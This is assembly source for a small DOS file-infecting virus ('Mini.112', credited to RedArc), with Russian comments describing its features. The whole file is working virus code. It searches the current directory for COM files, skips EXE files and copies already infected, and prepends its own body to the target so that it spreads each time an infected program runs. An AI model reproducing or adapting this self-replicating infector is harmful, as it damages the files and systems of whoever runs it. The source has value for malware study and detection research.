; Mini.112 (c) RedArc
; More Thanks for CrkV

;■ поиск и инфицирование COM-файлов в текущем каталоге
;■ инфицирование в начало
;■ не резидентный

;[+]
;■ оставляет программы работоспособными
;■ не заражает повторно уже инфицированные программы
;■ проверяет формат файла и не заражает EXEшники
;■ сохраняет переданные программе параметры
;■ корректный выход из зараженной программы ;-P

;[-]
;■ не сохраняет начальные значения регистров
;■ инфицирует только один файл за запуск

Model Tiny
.code
.286
jumps
org 100h
start:
       mov dx,cs
       inc dh

       mov es,dx
       mov ah,26h
       int 21h

       push si

       inc cx
       mov di,cx
       mov cl,MyLength
       xchg si,cx
       mov cx,0eeeeh
       repe movsb

       pop di

       push dx
       push di
       mov bp,sp

       push bx
       push 'mo'
       push 'c.'
       push '?*'

       mov dx,sp
       mov ah,4eh
       int 21h
@0:
       mov ah,4fh
       int 21h
       jc @1

       mov ax,-266Fh
       mov dx,-41Eh
       imul dx
       int 21h
       xchg bx,ax

       mov ah,3fh
       mov dl,MyLength
       inc dh
       mov si,dx
       push sp
       pop cx
       int 21h

       cmp ax,cx
       jz @0

       db 083h, 0c0h, MyLength
       push ax

       lodsw

       and ah,al
       cmp ah,048h
       je @0

       cmp al,8ch
       je @0

       mov ax,41ffh
       inc ax
       cwd
       mov cx,dx
       int 21h

       pop cx
       mov ah,40h
       inc dh
       int 21h

@1:
       push bp
       pop sp
       retf

MyLength equ $-start
      ret
end start
